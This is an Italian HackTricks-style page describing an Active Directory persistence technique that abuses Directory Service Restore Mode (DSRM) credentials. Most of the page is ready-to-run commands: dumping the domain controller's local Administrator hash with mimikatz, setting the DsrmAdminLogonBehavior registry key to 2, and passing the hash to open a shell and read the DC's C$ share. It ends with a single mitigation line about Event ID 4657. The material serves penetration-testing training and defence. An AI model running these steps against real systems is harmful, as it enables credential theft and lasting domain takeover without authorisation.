# Credenziali DSRM

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

All'interno di ogni **DC** è presente un account **local administrator**. Disponendo dei privilegi di amministratore su questa macchina, puoi usare mimikatz per **dump**are l'hash dell'utente **local Administrator**. Successivamente, modificando una chiave del registro per **attivare questa password**, puoi accedere da remoto a questo utente **local Administrator**.\
Per prima cosa dobbiamo **dump**are l'**hash** dell'utente **local Administrator** all'interno del DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Quindi dobbiamo verificare se quell'account funzionerà e, se la chiave del Registro di sistema ha valore "0" o non esiste, è necessario **impostarla su "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Quindi, usando un PTH puoi **elencare il contenuto di C$ o persino ottenere una shell**. Nota che, per creare una nuova sessione powershell con quell'hash in memoria (per il PTH), **il "domain" usato è semplicemente il nome della macchina DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Maggiori informazioni su questo argomento sono disponibili in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) e [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Mitigazione

- Event ID 4657 - Audit della creazione/modifica di `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Riferimenti

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
